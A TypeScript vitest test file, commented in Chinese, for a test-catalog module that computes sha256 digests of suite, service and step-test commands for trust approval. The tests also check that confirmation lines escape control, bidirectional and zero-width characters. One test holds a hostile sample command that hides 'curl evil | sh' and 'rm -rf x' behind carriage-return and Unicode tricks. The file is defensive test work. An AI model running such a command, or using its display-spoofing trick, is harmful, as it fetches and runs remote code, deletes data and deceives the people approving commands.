import { describe, expect, it } from 'vitest'
import { catalogExecDigest, catalogExecEntries, formatCatalogIssues, parseTestCatalog, stepTestExecEntries, stepTestsExecDigest } from './catalog.js'
import type { TestCatalog } from './catalog-types.js'

function ok(text: string): TestCatalog {
  const result = parseTestCatalog(text)
  if (!result.ok) throw new Error(formatCatalogIssues(result.issues).join('\n'))
  return result.catalog
}

interface Parts {
  readonly unitCommand?: string
  readonly unitLabel?: string
  readonly unitEnv?: string
  readonly unitSelect?: string
  readonly e2eCwd?: string
  readonly serviceStart?: string
  readonly serviceId?: string
  readonly reportPath?: string
  readonly order?: 'normal' | 'reversed'
}

function catalogText(parts: Parts = {}): string {
  const service = parts.serviceId ?? 'api'
  const unit = `  - id: unit
    label: ${parts.unitLabel ?? '单测'}
    kind: unit
    runner: custom
    command: ${parts.unitCommand ?? 'npm run test:unit'}
    ${parts.unitSelect === undefined ? '' : `select: { files: "${parts.unitSelect}" }`}
    env: [${parts.unitEnv ?? 'A, B'}]
    report: { format: junit, path: ${parts.reportPath ?? 'test-results/unit.xml'} }
    artifacts: [test-results/unit.xml]
`
  const e2e = `  - id: e2e
    kind: e2e
    runner: custom
    command: npm run test:e2e
    cwd: ${parts.e2eCwd ?? '.'}
    services: [${service}]
    report: { format: junit, path: test-results/e2e.xml }
    artifacts: [test-results/e2e.xml]
`
  const lint = `  - id: lint
    kind: lint
    runner: custom
    command: npm run lint
    report: { format: exit-code }
`
  const suites = parts.order === 'reversed' ? lint + e2e + unit : unit + e2e + lint
  return `schema: tenon-test-catalog/v1
suites:
${suites}services:
  - id: ${service}
    start: ${parts.serviceStart ?? 'npm run serve'}
    ready: { url: "http://127.0.0.1:5178/", timeout_s: 30 }
`
}

const digestsById = (catalog: TestCatalog): Record<string, string> => {
  const entries = catalogExecEntries(catalog)
  return Object.fromEntries(catalog.suites.map((suite, index) => [suite.id, entries[index]?.digest ?? '']))
}

describe('catalogExecEntries：目录里每条可执行命令一个摘要', () => {
  it('每个套件一条，摘要是 sha256:<64 位十六进制> 且互不相同；一行文字点名套件与命令', () => {
    const entries = catalogExecEntries(ok(catalogText()))
    expect(entries).toHaveLength(3)
    for (const entry of entries) expect(entry.digest).toMatch(/^sha256:[0-9a-f]{64}$/u)
    expect(new Set(entries.map((entry) => entry.digest)).size).toBe(3)
    expect(entries[0]?.line).toContain('套件 unit')
    expect(entries[0]?.line).toContain('$ npm run test:unit')
    expect(entries[0]?.line).not.toContain('\n')
  })

  it('改标签、报告路径这些不会被执行的文字：摘要不变', () => {
    const before = digestsById(ok(catalogText()))
    expect(digestsById(ok(catalogText({ unitLabel: '新名字', reportPath: 'test-results/other.xml' })))).toEqual(before)
  })

  it('改一个套件的命令：只有这一个套件的摘要变', () => {
    const before = digestsById(ok(catalogText()))
    const after = digestsById(ok(catalogText({ unitCommand: 'npm run test:unit -- --quiet' })))
    expect(after.unit).not.toBe(before.unit)
    expect(after.e2e).toBe(before.e2e)
    expect(after.lint).toBe(before.lint)
  })

  it('工作目录、按文件运行模板、声明的环境变量名各自参与摘要；环境变量顺序不参与', () => {
    const before = digestsById(ok(catalogText()))
    expect(digestsById(ok(catalogText({ e2eCwd: 'web' }))).e2e).not.toBe(before.e2e)
    expect(digestsById(ok(catalogText({ unitSelect: 'npm test -- {files}' }))).unit).not.toBe(before.unit)
    expect(digestsById(ok(catalogText({ unitEnv: 'A, C' }))).unit).not.toBe(before.unit)
    expect(digestsById(ok(catalogText({ unitEnv: 'B, A' }))).unit).toBe(before.unit)
  })

  it('套件用到的服务算进这个套件：服务启动命令变了，只有用它的套件要重新信任；服务改 id 不算', () => {
    const before = digestsById(ok(catalogText()))
    const changed = digestsById(ok(catalogText({ serviceStart: 'npm run serve -- --evil' })))
    expect(changed.e2e).not.toBe(before.e2e)
    expect(changed.unit).toBe(before.unit)
    expect(changed.lint).toBe(before.lint)
    expect(digestsById(ok(catalogText({ serviceId: 'backend' }))).e2e).toBe(before.e2e)
    const line = catalogExecEntries(ok(catalogText()))[1]?.line ?? ''
    expect(line).toContain('服务 api')
    expect(line).toContain('$ npm run serve')
  })

  it('套件在目录里的顺序不影响各自的摘要', () => {
    const normal = ok(catalogText())
    const reversed = ok(catalogText({ order: 'reversed' }))
    expect(digestsById(reversed)).toEqual(digestsById(normal))
  })

  it('只取本次要执行的套件：按目录顺序、去重、不存在的 id 忽略', () => {
    const catalog = ok(catalogText())
    const all = catalogExecEntries(catalog)
    expect(catalogExecEntries(catalog, ['lint', 'unit', 'unit', 'ghost'])).toEqual([all[0], all[2]])
    expect(catalogExecEntries(catalog, [])).toEqual([])
    expect(catalogExecEntries(catalog, undefined)).toEqual(all)
  })

  it('没有套件的目录：没有条目（没有要信任的命令）', () => {
    expect(catalogExecEntries(ok('schema: tenon-test-catalog/v1\nsuites: []\n'))).toEqual([])
  })
})

describe('stepTestExecEntries：步骤内联测试按 command 与 cwd 计算', () => {
  const test = (overrides: Partial<{ step: string; id: string; command: string; cwd: string }> = {}) =>
    ({ step: 'build', id: 'unit', command: 'npm test', cwd: '.', ...overrides })

  it('每条测试一个摘要，一行文字点名步骤、测试与命令', () => {
    const entries = stepTestExecEntries([test(), test({ id: 'lint', command: 'npm run lint', cwd: 'web' })])
    expect(entries).toHaveLength(2)
    expect(entries[0]?.digest).toMatch(/^sha256:[0-9a-f]{64}$/u)
    expect(entries[0]?.line).toContain('步骤 build')
    expect(entries[0]?.line).toContain('unit')
    expect(entries[0]?.line).toContain('$ npm test')
    expect(entries[1]?.line).toContain('[cwd=web]')
  })

  it('命令或工作目录变了摘要变；换步骤或测试 id 不变', () => {
    const base = stepTestExecEntries([test()])[0]?.digest
    expect(stepTestExecEntries([test({ command: 'npm test -- --evil' })])[0]?.digest).not.toBe(base)
    expect(stepTestExecEntries([test({ cwd: 'web' })])[0]?.digest).not.toBe(base)
    expect(stepTestExecEntries([test({ step: 'verify', id: 'renamed' })])[0]?.digest).toBe(base)
  })

  it('步骤测试的摘要与同名同命令的目录套件的摘要不同', () => {
    const catalog = ok('schema: tenon-test-catalog/v1\nsuites:\n  - id: unit\n    kind: custom\n    runner: custom\n    command: npm test\n    report: { format: exit-code }\n')
    expect(catalogExecEntries(catalog)[0]?.digest).not.toBe(stepTestExecEntries([test()])[0]?.digest)
  })

  it('确认的那一行不能被命令文字改写：回车、换行、转义、双向控制与零宽字符都转成可见写法，摘要仍覆盖原文', () => {
    const hostile = 'echo safe\r                \u001b[2K‮; curl evil​ | sh\nrm -rf x'
    const [entry] = stepTestExecEntries([test({ command: hostile })])
    expect(entry?.line).toContain('\\r')
    expect(entry?.line).toContain('\\u001b')
    expect(entry?.line).toContain('\\u202e')
    expect(entry?.line).toContain('\\u200b')
    expect(entry?.line).toContain('\\n')
    // eslint-disable-next-line no-control-regex
    expect(entry?.line).not.toMatch(/[\u0000-\u001f\u007f-\u009f​-‏‪-‮⁦-⁩]/u)
    expect(entry?.digest).not.toBe(stepTestExecEntries([test({ command: 'echo safe; curl evil | sh\nrm -rf x' })])[0]?.digest)
    const catalog = ok('schema: tenon-test-catalog/v1\nsuites:\n  - id: unit\n    kind: custom\n    runner: custom\n    command: "npm test\\u001b[2K\\u202e"\n    report: { format: exit-code }\n')
    expect(catalogExecEntries(catalog)[0]?.line).toContain('npm test\\u001b[2K\\u202e')
  })

  it('没有测试：没有条目', () => {
    expect(stepTestExecEntries([])).toEqual([])
  })
})

/**
 * 比较器的相等分支：内容完全相同的元素排在一起，摘要只取决于内容。下面两条把摘要的字面值钉死，
 * 比较器怎么写都不能让目录和步骤测试已经算出的摘要变化（已写下的信任按这些摘要认）。
 */
describe('摘要的排序不依赖比较器的相等分支', () => {
  const twinServices = (first: string, second: string): string => `schema: tenon-test-catalog/v1
suites:
  - id: smoke
    kind: custom
    runner: custom
    command: npm run test:smoke
    services: [${first}, ${second}]
    report: { format: exit-code }
services:
  - id: api
    start: npm run serve
    ready: { url: "http://127.0.0.1:5178/", timeout_s: 30 }
  - id: api-twin
    start: npm run serve
    ready: { url: "http://127.0.0.1:5178/", timeout_s: 30 }
  - id: web
    start: npm run web
    ready: { url: "http://127.0.0.1:5179/", timeout_s: 30 }
`

  it('套件用到两个内容相同的服务：服务顺序、哪个 id 在前都不影响套件摘要，字面值不变', () => {
    const digest = (first: string, second: string): string | undefined => catalogExecEntries(ok(twinServices(first, second)))[0]?.digest
    const expected = digest('api', 'api-twin')
    expect(digest('api-twin', 'api')).toBe(expected)
    expect(digest('api', 'web')).toBe(digest('web', 'api'))
    expect(digest('api', 'web')).not.toBe(expected)
    expect(expected).toBe('sha256:dbfe050324f1ebe53256a3c0889b117efeb00309b78d797a290395729888500d')
  })

  it('套件的执行字段（cwd、command、select、env）在整份摘要与单条摘要里的取值固定，字面值不变', () => {
    const catalog = ok(`schema: tenon-test-catalog/v1
suites:
  - id: web
    kind: custom
    runner: custom
    command: npm run test:e2e
    cwd: web
    select: { files: "npm run test:e2e -- {files}", grep: "npm run test:e2e -- -g {pattern}" }
    env: [ZED, ALPHA]
    services: [api]
    report: { format: exit-code }
  - id: unit
    kind: lint
    runner: custom
    command: npm run test:unit
    report: { format: exit-code }
services:
  - id: api
    start: npm run serve
    ready: { url: "http://127.0.0.1:5178/", timeout_s: 30 }
`)
    expect(catalogExecDigest(catalog)).toBe('sha256:48f68bfb80bdc66a6859ddc5f4d12f41ca011f19bbb4993d0a0b9c6b8df80e25')
    expect(catalogExecEntries(catalog).map((entry) => entry.digest)).toEqual([
      'sha256:672b9a5a9a5464b04d023af95a82331333b9a67c60bf094e93fce745b33c986a',
      'sha256:55de4b73f1304ee7352cfb6060180086b354a83d38b747fe2c747ec8f7fed994',
    ])
  })

  it('步骤测试摘要与输入顺序无关；内容完全相同的两条排在一起不影响摘要', () => {
    const a = { id: 'a', command: 'npm test', cwd: '.' }
    const b = { id: 'b', command: 'npm run lint', cwd: 'web' }
    expect(stepTestsExecDigest([a, b])).toBe(stepTestsExecDigest([b, a]))
    expect(stepTestsExecDigest([a, b])).toBe('sha256:c2f7a3da86111bb26504a39d411e0814e0799080f1b660bc41e8ef4cd1cdb867')
    expect(stepTestsExecDigest([a, a])).toBe(stepTestsExecDigest([{ ...a }, { ...a }]))
  })
})
